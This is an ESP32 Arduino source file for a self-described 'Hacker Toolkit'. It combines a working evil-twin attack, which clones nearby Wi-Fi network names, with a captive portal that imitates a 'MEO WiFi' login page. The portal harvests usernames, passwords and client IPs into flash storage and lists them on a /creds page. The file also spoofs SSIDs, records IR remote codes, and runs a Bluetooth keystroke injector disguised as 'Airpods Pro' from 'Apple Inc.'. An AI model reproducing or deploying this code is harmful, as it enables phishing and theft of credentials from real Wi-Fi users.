#include <WiFi.h>
#include <AsyncTCP.h>
#include <ESPAsyncWebServer.h>
#include <DNSServer.h>
#include <Wire.h>
#include <Adafruit_GFX.h>
#include <Adafruit_SSD1306.h>
#include <BleKeyboard.h>
#include <FS.h>
#include <SPIFFS.h>
#include <IRremote.h>

// --- HARDWARE DEFINITIONS ---
#define SCREEN_WIDTH 128
#define SCREEN_HEIGHT 64
#define OLED_RESET -1
Adafruit_SSD1306 display(SCREEN_WIDTH, SCREEN_HEIGHT, &Wire, OLED_RESET);

#define BTN_MODE 18
#define BTN_ACTION 19
#define IR_RECV_PIN 15
#define KEY_SEARCH 0x44

// --- WEBSERVER & DNS ---
AsyncWebServer server(80);
DNSServer dnsServer;

const byte DNS_PORT = 53;
IPAddress apIP(192, 168, 4, 1);
IPAddress netMsk(255, 255, 255, 0);

// --- WI-FI & MODES ---
const char* spoofSSIDs[] = {"FREE_WIFI", "HACKED_NET", "LOL_NET", "OPEN_WIFI"};
int currentSpoofSSIDIdx = 0;

// Use an enum for clearer state management
enum AppMode {
    MODE_STANDBY = 0,
    MODE_SSID_SPOOF,
    MODE_CAPTIVE_PORTAL,
    MODE_EVIL_TWIN_SCAN,   // Dedicated mode for Wi-Fi scanning
    MODE_EVIL_TWIN_AP,     // AP mode for Evil Twin after scan
    MODE_SHOW_CREDS,
    MODE_SHOW_IRS,
    MODE_BLE_HID_READY,
    MODE_BLE_HID_PAYLOAD
};
AppMode currentAppMode = MODE_STANDBY;

// --- GENERAL STATE VARIABLES ---
volatile int visitCount = 0; // volatile as it might be updated by web server (ISR context)

// For button debouncing
unsigned long lastDebounceTime = 0;
const unsigned long debounceDelay = 300;

// For Data Storage (using char arrays for better memory management)
#define MAX_STORED_ITEMS 10 // Max number of stored credentials or SSIDs
#define MAX_CRED_LEN 100    // Max length for a single credential string (e.g., U:user P:pass IP:ip MAC:mac)
#define MAX_SSID_LEN 32     // Max length for an SSID (32 bytes)

char capturedCreds[MAX_STORED_ITEMS][MAX_CRED_LEN + 1]; // +1 for null terminator
int credsCount = 0;

char targetSSIDs[MAX_STORED_ITEMS][MAX_SSID_LEN + 1]; // +1 for null terminator
int numTargets = 0;
int selectedTargetIdx = 0;

// --- BYTECAT MASCOT ---
const char* ByteCat1[] = {"  /\\_/\\ ", " ( o.o )", "  > ^ < "};
const char* ByteCat2[] = {"  /\\_/\\ ", " ( -.- )", "  > ^ < "};

// --- BLE KEYBOARD ---
BleKeyboard bleKeyboard("Airpods Pro", "Apple Inc.", 100);

// --- CAPTIVE PORTAL HTML ---
const char* html_page = R"rawliteral(
<!DOCTYPE html><html lang="en"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1.0">
<title>MEO WiFi Login</title><style>body{background:#f4f4f4;font-family:Arial;display:flex;justify-content:center;align-items:center;height:100vh;margin:0}
.container{background:white;padding:20px;box-shadow:0 0 10px gray;border-radius:8px}h2{color:#003366}input,button{width:100%;padding:10px;margin:10px 0}button{background:#00a1e0;color:white;border:none}</style>
</head><body><div class="container"><h2>Log in to MEO WiFi network</h2><form method="POST" action="/login">
<input name="user" placeholder="Username" required>
<input name="pass" type="password" placeholder="Password" required>
<button type="submit">Enter</button></form>
<div class="note">By logging in, you accept the Terms and Conditions.</div></div></body></html>
)rawliteral";

// --- SPIFFS UTILITIES ---
void appendToFile(const char* path, const String& data) {
    File file = SPIFFS.open(path, FILE_APPEND);
    if (!file) {
        Serial.println("ERROR: Failed to open file for appending.");
        return;
    }
    file.println(data);
    file.close();
    Serial.printf("SPIFFS: Appended to %s: %s\n", path, data.c_str());
}

String readFile(const char* path) {
    File file = SPIFFS.open(path, FILE_READ);
    if (!file) {
        Serial.println("ERROR: Failed to open file for reading.");
        return "";
    }
    String content = file.readString();
    file.close();
    return content;
}

void clearFile(const char* path) {
    File file = SPIFFS.open(path, FILE_WRITE); // Opening in WRITE mode truncates the file
    if (!file) {
        Serial.println("ERROR: Failed to open file for clearing.");
        return;
    }
    file.close();
    Serial.printf("SPIFFS: File cleared: %s\n", path);
}

// --- DISPLAY UTILITIES ---
void showMascot(bool blink) {
    display.setTextSize(1);
    display.setCursor(0, 0);
    display.println(blink ? ByteCat1[0] : ByteCat2[0]);
    display.setCursor(0, 8);
    display.println(blink ? ByteCat1[1] : ByteCat2[1]);
    display.setCursor(0, 16);
    display.println(blink ? ByteCat1[2] : ByteCat2[2]);
}

// Optimized updateDisplay to avoid String objects
void updateDisplay(const char* title, const char* info, int visitors, bool blink) {
    display.clearDisplay();
    showMascot(blink);
    display.setCursor(0, 32);
    display.print("Mode: ");
    display.println(title);
    display.print("SSID: ");
    display.println(info);
    display.print("Visitors: ");
    display.println(visitors);
    display.display();
}

void showCredsDisplay() {
    display.clearDisplay();
    showMascot(true); // Always blink when showing credentials
    display.setCursor(0, 32);
    display.println("Credentials:");

    // Display the last two captured credentials
    if (credsCount > 0) {
        display.println(capturedCreds[credsCount - 1]);
        if (credsCount > 1) {
            display.println(capturedCreds[credsCount - 2]);
        }
    } else {
        display.println("None captured yet.");
    }
    display.display();
}

void showIRsOnDisplay() {
    display.clearDisplay();
    display.setCursor(0, 0);
    display.setTextSize(1);
    display.println("IR Signals:");

    File file = SPIFFS.open("/irs.txt", FILE_READ);
    if (!file) {
        display.println("Error opening /irs.txt");
        display.display();
        return;
    }

    String irLines[5]; // Store last 5 IR lines
    int lineCount = 0;
    while (file.available() && lineCount < 5) {
        String line = file.readStringUntil('\n');
        line.trim(); // Remove newline/carriage return
        if (line.length() > 0) {
            irLines[lineCount++] = line;
        }
    }
    file.close();

    // Display from the most recent
    int y = 10;
    for (int i = 0; i < lineCount; i++) {
        display.setCursor(0, y);
        display.println(irLines[i]);
        y += 10;
    }
    display.display();
}

// --- WI-FI & CAPTIVE PORTAL MANAGEMENT ---
// --- WI-FI & CAPTIVE PORTAL MANAGEMENT ---
void stopWifiServices() {
    if (WiFi.getMode() != WIFI_OFF) { // Only attempt to stop if WiFi is active
        WiFi.softAPdisconnect(true);
        WiFi.mode(WIFI_OFF); // Turn off Wi-Fi completely
        Serial.println("Wi-Fi turned OFF.");
    }
    dnsServer.stop();
    Serial.println("DNS Server stopped.");
    
    server.end(); // Stop the web server
    visitCount = 0;
    Serial.println("All Wi-Fi services stopped.");
}

void startCaptivePortal(const char* ssid) {
    stopWifiServices(); // Ensure everything is stopped before starting

    WiFi.mode(WIFI_AP);
    WiFi.softAPConfig(apIP, apIP, netMsk);
    WiFi.softAP(ssid, "", 6); // Channel 6
    Serial.printf("AP '%s' started on IP %s\n", ssid, WiFi.softAPIP().toString().c_str());
    delay(200); // Small delay for the AP to settle

    dnsServer.start(DNS_PORT, "*", apIP);
    Serial.println("DNS Server started.");

    // Configure web server handlers
    server.on("/", HTTP_GET, [](AsyncWebServerRequest *request) {
        visitCount++;
        request->send(200, "text/html", html_page);
    });

    server.on("/login", HTTP_POST, [](AsyncWebServerRequest *request) {
        String username = request->arg("user");
        String password = request->arg("pass");
        String clientIP = request->client()->remoteIP().toString();
        String espMAC = WiFi.softAPmacAddress();

        // Format string into char array buffer
        char entryBuffer[MAX_CRED_LEN + 1];
        snprintf(entryBuffer, sizeof(entryBuffer), "U:%s P:%s IP:%s MAC:%s",
                 username.c_str(), password.c_str(), clientIP.c_str(), espMAC.c_str());

        if (credsCount < MAX_STORED_ITEMS) {
            strncpy(capturedCreds[credsCount], entryBuffer, MAX_CRED_LEN);
            capturedCreds[credsCount][MAX_CRED_LEN] = '\0'; // Ensure null-termination
            credsCount++;
        }
        appendToFile("/creds.txt", entryBuffer);
        appendToFile("/macs.txt", espMAC);

        request->redirect("/"); // Redirect back to the login page
    });

    server.onNotFound([](AsyncWebServerRequest *request) {
        // Redirect all unknown requests to the captive portal
        request->redirect("/");
    });

    // Log pages
    server.on("/creds", HTTP_GET, [](AsyncWebServerRequest *request){
        String content = "<!DOCTYPE html><html><body><h2>Credentials</h2><ul>";
        File file = SPIFFS.open("/creds.txt", FILE_READ);
        if(file) {
            while (file.available()) content += "<li>" + file.readStringUntil('\n') + "</li>";
            file.close();
        }
        content += "</ul><br><a href='/'>Back to portal</a></body></html>";
        request->send(200, "text/html", content);
    });

    server.on("/macs", HTTP_GET, [](AsyncWebServerRequest *request){
        String content = "<!DOCTYPE html><html><body><h2>Registered MACs</h2><ul>";
        File file = SPIFFS.open("/macs.txt", FILE_READ);
        if(file) {
            while (file.available()) content += "<li>" + file.readStringUntil('\n') + "</li>";
            file.close();
        }
        content += "</ul><br><a href='/'>Back to portal</a></body></html>";
        request->send(200, "text/html", content);
    });

    server.on("/irs", HTTP_GET, [](AsyncWebServerRequest *request){
        String content = "<!DOCTYPE html><html><body><h2>Captured IR Signals</h2><ul>";
        File file = SPIFFS.open("/irs.txt", FILE_READ);
        if(file) {
            while (file.available()) content += "<li>" + file.readStringUntil('\n') + "</li>";
            file.close();
        }
        content += "</ul><br><a href='/'>Back to portal</a></body></html>";
        request->send(200, "text/html", content);
    });

    server.begin();
    Serial.println("Webserver started.");
}

void doWiFiScan() {
    Serial.println("Initiating Wi-Fi scan...");
    stopWifiServices(); // Ensure Wi-Fi is not in AP mode

    WiFi.mode(WIFI_STA); // Switch to Station mode for scanning
    WiFi.disconnect(true); // Disconnect from any previous AP and clear credentials
    delay(100); // Small delay for mode change to take effect

    numTargets = WiFi.scanNetworks(false, true); // Don't block, show hidden
    Serial.printf("Found %d networks.\n", numTargets);

    if (numTargets == 0) {
        strncpy(targetSSIDs[0], "NoNetworks", MAX_SSID_LEN);
        targetSSIDs[0][MAX_SSID_LEN] = '\0';
        numTargets = 1; // Treat "NoNetworks" as a single target
    } else {
        for (int i = 0; i < numTargets && i < MAX_STORED_ITEMS; i++) {
            strncpy(targetSSIDs[i], WiFi.SSID(i).c_str(), MAX_SSID_LEN);
            targetSSIDs[i][MAX_SSID_LEN] = '\0'; // Ensure null-termination
            Serial.printf("  %d: %s (RSSI: %d)\n", i + 1, targetSSIDs[i], WiFi.RSSI(i));
        }
    }
    selectedTargetIdx = 0; // Reset selection after scan

    // IMPORTANT: After scan, switch back to AP mode if needed by next state
    // This will be handled by the next state transition in loop()
}

// --- BLE / HID FUNCTIONS ---
void startBLE() {
    stopWifiServices(); // Ensure Wi-Fi is off for BLE
    bleKeyboard.begin();
    Serial.println("BLE Keyboard started. Advertising...");
}

void stopBLE() {
    // BleKeyboard doesn't have an explicit 'end' method to stop advertising.
    // Toggling WiFi.mode(WIFI_OFF) or restarting the ESP is the most effective way to stop BLE.
    // 'stopWifiServices' already handles WiFi.mode(WIFI_OFF).
    Serial.println("BLE Keyboard stopped (assuming WiFi is OFF).");
}

void executeHIDPayload() {
    if (!bleKeyboard.isConnected()) {
        Serial.println("BLE Keyboard not connected to a host.");
        updateDisplay("HID Error", "Not Connected", 0, false);
        delay(1500); // Show error for a moment
        return;
    }

    Serial.println("Sending HID payload...");
    delay(2000); // Small delay before sending (to allow host to react)
    bleKeyboard.write(KEY_MEDIA_WWW_HOME); // Open browser/home
    delay(1500);
    const char* url = "https://github.com/pedrolucas7i";
    for (int i = 0; url[i] != '\0'; ++i) { // Iterate over char array
        bleKeyboard.print(url[i]);
        delay(50); // Small delay between characters
    }
    bleKeyboard.write(KEY_RETURN);
    Serial.println("HID payload sent.");
}

// --- SETUP FUNCTION ---
void setup() {
    Serial.begin(115200);
    Serial.println("\n--- ESP32 Hacker Toolkit Starting ---");

    // Initialize button pins
    pinMode(BTN_MODE, INPUT_PULLDOWN);
    pinMode(BTN_ACTION, INPUT_PULLDOWN);

    // Initialize SPIFFS
    if (!SPIFFS.begin(true)) { // true will format if mount fails
        Serial.println("ERROR: Failed to mount SPIFFS. Restarting...");
        delay(1000);
        ESP.restart(); // Restart if SPIFFS initialization fails
    } else {
        Serial.println("SPIFFS mounted successfully.");
        // Optional: Clear log files at startup for fresh start during development
        // clearFile("/creds.txt");
        // clearFile("/macs.txt");
        // clearFile("/irs.txt");
    }

    // Initialize OLED display (I2C)
    Wire.begin(); // Initialize I2C for OLED
    if (!display.begin(SSD1306_SWITCHCAPVCC, 0x3C)) { // 0x3C is the typical I2C address
        Serial.println(F("ERROR: SSD1306 allocation failed or not found. Halting."));
        while (true); // Halt if OLED fails to initialize
    }
    display.setTextColor(WHITE);
    display.display(); // Clear buffer and show Adafruit logo initially
    delay(2000);
    display.clearDisplay();
    updateDisplay("Initializing", "Please Wait...", 0, true);

    // Ensure Wi-Fi is off at startup
    stopWifiServices();

    // Initialize IR receiver
    IrReceiver.begin(IR_RECV_PIN, ENABLE_LED_FEEDBACK);
    Serial.printf("IR Receiver initialized on pin %d.\n", IR_RECV_PIN);

    // Set initial application mode
    currentAppMode = MODE_STANDBY;
    updateDisplay("Standby", "-", visitCount, true);
    Serial.println("Application initialized in Standby mode.");
}

// --- MAIN LOOP FUNCTION ---
void loop() {
    yield(); // Allow other FreeRTOS tasks to run

    // Process DNS requests (essential for captive portal)
    dnsServer.processNextRequest();

    // Blink mascot on display periodically
    bool blink = millis() % 1000 < 500;

    // Process IR signals
    if (IrReceiver.decode()) {
        unsigned long irCode = IrReceiver.decodedIRData.decodedRawData;
        String irHex = String(irCode, HEX); // Convert IR code to hex string
        appendToFile("/irs.txt", irHex); // Save to SPIFFS
        Serial.printf("IR Captured: 0x%s\n", irHex.c_str());

        // Briefly show captured IR on display
        display.clearDisplay();
        display.setCursor(0, 0);
        display.println("IR Captured:");
        display.println(irHex);
        display.display();
        delay(1000); // Show for 1 second

        // Return to the previous display state or refresh if in SHOW_IRS mode
        if (currentAppMode == MODE_SHOW_IRS) {
            showIRsOnDisplay(); // Refresh the list of IR signals
        } else {
            // Restore display for the current mode
            // This is a simplified approach; a more robust solution would push to a display queue
            updateDisplay(
                (currentAppMode == MODE_SSID_SPOOF) ? "SSID Spoof" :
                (currentAppMode == MODE_CAPTIVE_PORTAL) ? "Captive Portal" :
                (currentAppMode == MODE_EVIL_TWIN_AP) ? "Evil Twin" :
                (currentAppMode == MODE_BLE_HID_READY) ? "Bluetooth HID" :
                "Standby",
                (currentAppMode == MODE_SSID_SPOOF) ? spoofSSIDs[currentSpoofSSIDIdx] :
                (currentAppMode == MODE_CAPTIVE_PORTAL) ? "LOGIN_PORTAL" :
                (currentAppMode == MODE_EVIL_TWIN_AP) ? targetSSIDs[selectedTargetIdx] :
                (currentAppMode == MODE_BLE_HID_READY) ? "Waiting" :
                "-",
                visitCount, blink
            );
        }
        IrReceiver.resume(); // Important: Resume IR receiver to capture next signal
    }

    // --- BUTTON POLLING AND MODE CHANGES ---
    unsigned long currentTime = millis();
    if (currentTime - lastDebounceTime > debounceDelay) {
        if (digitalRead(BTN_MODE) == HIGH) {
            lastDebounceTime = currentTime;
            // Cycle through modes
            currentAppMode = (AppMode)(((int)currentAppMode + 1) % 9); // Cycle modes 0-8
            Serial.printf("MODE button pressed. New mode: %d\n", (int)currentAppMode);

            // Actions to perform when entering a new mode
            switch (currentAppMode) {
                case MODE_STANDBY:
                    stopWifiServices();
                    stopBLE();
                    updateDisplay("Standby", "-", visitCount, blink);
                    break;
                case MODE_SSID_SPOOF:
                    startCaptivePortal(spoofSSIDs[currentSpoofSSIDIdx]);
                    updateDisplay("SSID Spoof", spoofSSIDs[currentSpoofSSIDIdx], visitCount, blink);
                    break;
                case MODE_CAPTIVE_PORTAL:
                    startCaptivePortal("LOGIN_PORTAL");
                    updateDisplay("Captive Portal", "LOGIN_PORTAL", visitCount, blink);
                    break;
                case MODE_EVIL_TWIN_SCAN:
                    // This mode initiates the scan
                    stopWifiServices();
                    updateDisplay("Evil Twin Scan", "Scanning...", 0, true);
                    doWiFiScan(); // This is a blocking call
                    // After scan, immediately transition to AP mode for Evil Twin
                    currentAppMode = MODE_EVIL_TWIN_AP;
                    // Fallthrough to MODE_EVIL_TWIN_AP to start AP with first target
                case MODE_EVIL_TWIN_AP:
                    // If arrived here directly (e.g., from cycle) and no targets, do a scan
                    if (numTargets == 0) {
                        updateDisplay("Evil Twin Scan", "Scanning...", 0, true);
                        doWiFiScan();
                    }
                    startCaptivePortal(targetSSIDs[selectedTargetIdx]);
                    updateDisplay("Evil Twin", targetSSIDs[selectedTargetIdx], visitCount, blink);
                    break;
                case MODE_SHOW_CREDS:
                    stopWifiServices();
                    stopBLE();
                    showCredsDisplay();
                    break;
                case MODE_SHOW_IRS:
                    stopWifiServices();
                    stopBLE();
                    showIRsOnDisplay();
                    break;
                case MODE_BLE_HID_READY:
                    startBLE();
                    updateDisplay("Bluetooth HID", "Waiting", 0, blink);
                    break;
                case MODE_BLE_HID_PAYLOAD:
                    // This mode is meant to be activated by the ACTION button, not MODE.
                    // If entered via MODE, revert to BLE_HID_READY.
                    currentAppMode = MODE_BLE_HID_READY;
                    updateDisplay("Bluetooth HID", "Waiting", 0, blink);
                    break;
            }
        }

        if (digitalRead(BTN_ACTION) == HIGH) {
            lastDebounceTime = currentTime;
            Serial.printf("ACTION button pressed. Current mode: %d\n", (int)currentAppMode);

            switch (currentAppMode) {
                case MODE_SSID_SPOOF:
                    // Cycle through spoof SSIDs
                    currentSpoofSSIDIdx = (currentSpoofSSIDIdx + 1) % (sizeof(spoofSSIDs) / sizeof(spoofSSIDs[0]));
                    startCaptivePortal(spoofSSIDs[currentSpoofSSIDIdx]);
                    updateDisplay("SSID Spoof", spoofSSIDs[currentSpoofSSIDIdx], visitCount, blink);
                    break;
                case MODE_EVIL_TWIN_AP:
                    // Cycle through scanned target SSIDs
                    if (numTargets > 0) {
                        selectedTargetIdx = (selectedTargetIdx + 1) % numTargets;
                        startCaptivePortal(targetSSIDs[selectedTargetIdx]);
                        updateDisplay("Evil Twin", targetSSIDs[selectedTargetIdx], visitCount, blink);
                    } else {
                        Serial.println("No targets to cycle through.");
                        updateDisplay("Evil Twin", "No Targets", visitCount, blink);
                    }
                    break;
                case MODE_BLE_HID_READY:
                    executeHIDPayload();
                    // After sending payload, transition to a "payload sent" state
                    updateDisplay("Payload Sent", "github.com/pedrolucas7i", 0, blink);
                    currentAppMode = MODE_BLE_HID_PAYLOAD;
                    break;
                default: // Default action for other modes: full reset
                    stopWifiServices();
                    stopBLE();
                    currentAppMode = MODE_STANDBY;
                    updateDisplay("Resetting", "-", 0, blink);
                    break;
            }
        }
    }

    // --- CONTINUOUS DISPLAY UPDATE FOR ACTIVE MODES ---
    // This section ensures the display reflects the current state, visitor count, etc.
    // It's important for modes where information changes (e.g., visitCount) or to show mascot blinking.
    static unsigned long lastDisplayRefreshTime = 0;
    if (currentTime - lastDisplayRefreshTime > 500) { // Refresh every 500ms
        lastDisplayRefreshTime = currentTime;
        switch (currentAppMode) {
            case MODE_SSID_SPOOF:
                updateDisplay("SSID Spoof", spoofSSIDs[currentSpoofSSIDIdx], visitCount, blink);
                break;
            case MODE_CAPTIVE_PORTAL:
                updateDisplay("Captive Portal", "LOGIN_PORTAL", visitCount, blink);
                break;
            case MODE_EVIL_TWIN_AP:
                updateDisplay("Evil Twin", targetSSIDs[selectedTargetIdx], visitCount, blink);
                break;
            case MODE_BLE_HID_READY:
                updateDisplay("Bluetooth HID", "Waiting", 0, blink);
                break;
            case MODE_BLE_HID_PAYLOAD:
                updateDisplay("Payload Sent", "github.com/pedrolucas7i", 0, blink);
                break;
            case MODE_STANDBY:
                updateDisplay("Standby", "-", visitCount, blink);
                break;
            // No continuous update for MODE_SHOW_CREDS, MODE_SHOW_IRS, MODE_EVIL_TWIN_SCAN
            // as their content is static or updated on mode entry/IR detection.
            default:
                break;
        }
    }
}